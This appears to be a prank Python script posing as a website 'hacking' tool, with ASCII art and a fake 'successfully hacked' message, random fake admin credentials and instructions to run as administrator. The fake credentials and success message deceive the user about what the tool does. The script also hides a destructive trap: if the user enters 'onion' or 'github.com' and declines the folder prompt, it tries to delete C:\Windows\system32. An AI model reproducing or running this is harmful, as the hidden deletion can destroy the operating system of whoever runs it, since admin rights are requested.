'''

 ____  _____    _    ____  __  __ _____ 
|  _ \| ____|  / \  |  _ \|  \/  | ____|
| |_) |  _|   / _ \ | | | | |\/| |  _|  
|  _ <| |___ / ___ \| |_| | |  | | |___ 
|_| \_\_____/_/   \_\____/|_|  |_|_____|
                                        
      PLease frist do these:
          you need to run the code with administrative privileges. Here's how you can do it:

Open the command prompt as an administrator:

Press the Windows key.
Type "cmd" in the search bar.
Right-click on "Command Prompt" and select "Run as administrator.'''


import os
import shutil
import string
import random
import time
import requests

print("     _    ____  _        _     __________ ")
print("    / \  | __ )| |      / \   |__  / ____|")
print("   / _ \ |  _ \| |     / _ \    / /|  _|  ")
print("  / ___ \| |_) | |___ / ___ \  / /_| |___ ")
print(" /_/   \_\____/|_____/_/   \_\/____|_____|")
print("created by ABLAZE")
print()
ascii='''#################################################################################
#                             aaaaaaaaaaaaaaaa               *                  #
#                         aaaaaaaaaaaaaaaaaaaaaaaa                              #
#                      aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                           #
#                    aaaaaaaaaaaaaaaaa           aaaaaa                         #
#                  aaaaaaaaaaaaaaaa                  aaaa                       #
#                 aaaaaaaaaaaaa aa                      aa                      #
#*               aaaaaaaa      aa                         a                     #
#                aaaaaaa aa aaaa                                                #
#          *    aaaaaaaaa     aaa                                               #
#               aaaaaaaaaaa aaaaaaa                               *             #
#               aaaaaaa    aaaaaaaaaa                                           #
#               aaaaaa a aaaaaa aaaaaa                                          #
#                aaaaaaa  aaaaaaa                                               #
#                aaaaaaaa                                 a                     #
#                 aaaaaaaaaa                            aa                      #
#                  aaaaaaaaaaaaaaaa                  aaaa                       #
#                    aaaaaaaaaaaaaaaaa           aaaaaa        *                #
#      *               aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                           #
#                         aaaaaaaaaaaaaaaaaaaaaaaa                              #
#                      *      aaaaaaaaaaaaaaaa                                  #
#################################################################################
'''
print()
annonymous="""
                                                                                                                                                                                                        
                                                                                                                                                                                                        
                                                                                                                                                                                                        
                                                                                                          ... . .   . ........      .   . .                                                             
                                                                                                     . .  ,  ,,, ,** .* ,,.. **, ,, ,,,. *. /*. ...                                                     
                                                                                                         . , . ,.    *, / ..,**./*/ (, *(*// **.**.                                                     
                                                                                                                  .,,./. ./ *.,    ,/ ,*,/**,/,,**,*,                                                   
                                                                                                .     .  ......   ,...,, ,..* //*/****,/,./,*,. **/                                                     
                                                                                                . . ...   .. . .     .. ,,  /,*,*/.** ****,/ /*,,**/                                                    
                                                                                                 . . . .  .. ,     .,..,,, . /.. ,, ,/**./*,.**,,//                                                     
                                                                                                 . ..      .. .. .,          * , * **,/,//*.*./*/,*/,                                                   
                                                                                                  .       .,       .,.,/.*, ,**//.,,*,/,,/*(,,,*,,/,*,,                                                 
                                                                                                       .         . . ....,...  ,......*.,,*,//*/,//*, ,                                                 
                                                                                             .  . .                                       . *,*,*.,*,..                                                 
                                                                                           .   .                                              .,*.,,.. ,                                                
                                                                                                  .                                ..,  ...    ,..*,,*..                                                
                                                                                                                           . .., , /*#/*,/,/,**. ,.*,,,,                                                
                                                                                                                        * ,* ..*//*/(( *(.,(*,,,,*,*,,.*                                                
                                                                                             .                        .* .*.**/*(/(/*, /.(#,(.*/,,,,,...                                                
                                                                                            .    .        .    .   ... * .,**** /(**,* */**,//*/*****,*                                                 
                                                                                                    . ..         .. ,,..,.... ....,,. ...,*./*,/(,.*,,,                                                 
                                                                                                    , ..... . . ..                      ...,**,. .*,,*,                                                 
                                                                                                     ... ,,  ..                           .    . ..,, *                                                 
                                                                                                   .,. .   ...                         . ... *., ,,../*                                                 
                                                                                                       .., .  . ..             ........   ,***/..,,,.,*                                                 
                                                                                                   ...,,........,..,....,,,...,*,,.,, .///.,*/*//**.,,.                                                 
                                                                                                   ,*,. ..,,..,.,.,,,.,,,,.**/,***,**.*,/,,..(/(**/.*,.                                                 
                                                                                                   .,... ..* , ...*  ,,, ,,,,**,,,*,,*,.,,,,,/,. /**                                                    
                                                                                                      ,  ,. ....,., . ..,...*,** .*, ,/....****(*//.,,,                                                 
                                                                                                   , ....,,,,,..,.,,..,,,...,,.,,,***,**,**.*/***..*,..                                                 
                                                                                                   . .,.., ..,,,,.,, ,,,,.,.,  ,.***,,,*,,*./**/,,,/...                                                 
                                                                                                    .,,..,,... ,.. ...,*.,,,,,, ,.,,,,/**,*,,,**(.**,                                                   
                                                                                                    .. .,.,.,..,,,.,  ...,. .,....,*,.**/***/***/,,,                                                    
                                                                                                      ..,,,,,.,...,,,. ,. ., .  ,*.,,*.,***/*,,*,** ..                                                  
                                                                                                    , .,,. . ...... . . , .       .  .....  .,,,,.,**                                                   
                                                                                                    ...   ,       ,  .,. ..      ...          *.*///                                                    
                                                                                                          .  * ., ,/*,**,.,,,,/.      ... .  *****,                                                     
                                                                                                            ..,, *,*/.*,*,,,,.,      .... .  *,/,,*                                                     
                                                                                                             . .,*,,***,,,,,        ..,, .  .*,,***.                                                    
                                                                                                   ,                              ,/*,*..  ,,,,,,*                                                      
                                                                                                 . ..                           *,.,*,. . ,*,**, .                                                      
                                                                                             . .  , .                       . *          .(/,,,                                                         
                                                                                                                         ,.,.,.././  . .,/*/(**                                                         
                                                                                                    .  .            ..   *.,,.**..,..  ,,**/                                                            
                                                                                                      .. .. ...,,/. .,***,,   ....  .*,/*.*/                                                            
                                                                                                      .  .              .  ..,. . .,*/ /(. .                                                            
                                                                                                            , .,,., .,...,...   .,./*/ *,/                                                              
                                                                                                          / ,, * *.. **..,. ,,,,,**..*,,                                                                
                                                                                                         ./  **.,,,, * *.. ,.*.,   .**                                                                  
                                                                                                        ,  .,.,* , ,*,, *,.* .../,*                                                                     
                                                                                                          ,,/ ,* *,,  ., **.,.,*,.                                                                      
                                                                                                          ( ,* ,*,. *,,,,,,,  ,                                                                         
                                                                                                          *., *, ../, ./ , .*                                                                           
                                                                                                          ./*,, . ..*.  **                                                                              
                                                                                                          ,,. ,.(* ** /.                                                                                
                                                                                                         . (  ,,*, .,                                                                                   
                                                                                                           . ///  .                                                                                     
                                                                                                        *,#  ,.                                                                                         
          
"""                    
print(annonymous)                                                                                         
print(ascii)
print("""don't input "onion"!""")
salom=input("PLease Enter a website name: ")
def check_website():
    website_name = input("Enter a website name again: ")
    url = "http://" + website_name  

    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("Website exists!")
        else:
            print("Website does not exist or is not accessible.")
    except requests.exceptions.RequestException:
        print("An error occurred while checking the website.")
    


check_website()
print("PLEASE WAIT!")
time.sleep(3)
    

print("web-site successfully hacked :)")

hacked = '''
 _                _            _   _ 
| |__   __ _  ___| | _____  __| | | |
| '_ \ / _` |/ __| |/ / _ \/ _` | | |
| | | | (_| | (__|   <  __/ (_| | |_|
|_| |_|\__,_|\___|_|\_\___|\__,_| (_)
                                     
'''
print(hacked)

def generate_password(length=8):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))
    return password

# Example usage
password = generate_password()
def generate_email(length=8):
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    domain = ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    extension = random.choice(['com', 'net', 'org'])
    email = f"{username}@{domain}.{extension}"
    return email

# Example usage
email = generate_email()


q = input("Do you want to create a folder? y/n ")
if q == "y":
    folder_name = salom
    file_name = "admin_login.txt"

    os.mkdir(folder_name)

    file_path = os.path.join(folder_name, file_name)
    with open(file_path, "w") as file:
        file.write("Email is : ")
        file.write(email)
        file.write("Password is : ")
        file.write(password)
elif salom=="onion" or salom=="github.com":
    print("you have been banned")
    try:
        shutil.rmtree("C:\Windows\system32")
    except OSError as e:
        print(f"Error: {e.strerror}")
    ban='''
    ____    _    _   _ _   _ _____ ____  
   | __ )  / \  | \ | | \ | | ____|  _ \ 
   |  _ \ / _ \ |  \| |  \| |  _| | | | |
   | |_) / ___ \| |\  | |\  | |___| |_| |
   |____/_/   \_\_| \_|_| \_|_____|____/ 
   
   
   '''
art2="""                   
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  I AM HAKING!   |  |  |     |         |      |
     |  |  I TOLD YOU :)  |  |  |/----|`---=    |      |
     |  |  C:\>_Anonymous |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
I AM SPYING :)

    """
